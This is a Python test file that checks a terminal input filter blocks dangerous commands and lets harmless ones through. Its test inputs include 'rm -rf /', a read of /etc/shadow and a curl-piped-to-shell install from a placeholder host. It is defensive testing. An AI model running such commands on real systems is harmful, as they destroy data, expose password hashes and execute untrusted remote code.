from app.services.terminal_input_filter import TerminalInputFilter


def test_terminal_input_filter_blocks_rm_rf_before_enter_is_sent() -> None:
    terminal_filter = TerminalInputFilter()

    assert terminal_filter.inspect("rm -rf /") is not None


def test_terminal_input_filter_blocks_completed_shadow_read_line() -> None:
    terminal_filter = TerminalInputFilter()

    assert terminal_filter.inspect("cat /etc/shadow\r").code == "dangerous_fragment"


def test_terminal_input_filter_blocks_piped_curl_shell() -> None:
    terminal_filter = TerminalInputFilter()

    violation = terminal_filter.inspect("curl http://example.invalid/install.sh | sh\n")

    assert violation is not None
    assert violation.code in {"dangerous_fragment", "dangerous_command"}


def test_terminal_input_filter_allows_plain_ls() -> None:
    terminal_filter = TerminalInputFilter()

    assert terminal_filter.inspect("ls -la\n") is None
